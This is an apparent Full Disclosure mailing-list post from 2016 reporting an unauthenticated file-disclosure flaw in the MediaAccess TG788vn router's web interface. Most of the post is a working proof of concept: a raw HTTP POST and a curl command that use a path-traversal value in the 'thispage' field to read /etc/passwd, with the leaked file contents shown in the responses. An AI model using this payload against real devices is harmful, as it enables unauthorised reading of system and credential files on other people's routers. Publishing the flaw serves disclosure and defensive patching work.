
Date: Wed, 6 Jan 2016 01:37:03 +0200
From: Ahmed Sultan <0x4148@...il.com>
To: "submissions@...ketstormsecurity.org"
 <submissions@...ketstormsecurity.org>, 
 "submit@...ecurity.com" <submit@...ecurity.com>,
 "submit@...sec.com" <submit@...sec.com>, submit@...y.today, 
 inj3ct0 r <mr.inj3ct0r@...il.com>, full-disclosure@...ts.grok.org.uk, 
 fulldisclosure@...lists.org
Subject: [FD] MediaAccess , unauthenticated file disclosure

Vulnerable hardware : MediaAccess TG788vn with Cisco http firewall
Author : Ahmed Sultan (0x4148)
Email : 0x4148@...il.com

MediaAccess TG788vn with Cisco firewall http config is vulnerable to
critical unauthenticated file disclosure flaw,

POC

Request:
POST /scgi-bin/platform.cgi HTTP/1.1
Host: xx.xx.xx.xx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://xx.xx.xx.xx/scgi-bin/platform.cgi
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 164

button.login.home=Se%20connecter&Login.userAgent=0x4148_Fu&reload=0&SSLVPNUser.Password=0x4148Fu&SSLVPNUser.UserName=0x4148&thispage=../../../../../../etc/passwd%00

Response:
HTTP/1.0 200 OK
Date: Sat, 01 Jan 2011 00:00:45 GMT
Server: Embedded HTTP Server.
Connection: close

loic_ipsec:x:500:500:xauth:/:/bin/cli

The juicy contents are found in the headers

POC
root@...148:~# curl "https://xx.xx.xx.xx/scgi-bin/platform.cgi" --data
"button.login.home=Se%20connecter&Login.userAgent=0x4148Fu&reload=0&SSLVPNUser.Password=0x4148Fu&SSLVPNUser.UserName=0x4148&thispage=../../../../../../../../../../etc/passwd%00.htm"
--insecure -i
HTTP/1.0 200 OK
Date: Sat, 01 Jan 2011 00:00:45 GMT
Server: Embedded HTTP Server.
Connection: close
root:ROOT_PASSWORD:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/nonexistent:/bin/false

loic_ipsec:x:500:500:xauth:/:/bin/cli

Download attachment "3.png" of type "image/png" (8566 bytes)


_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/
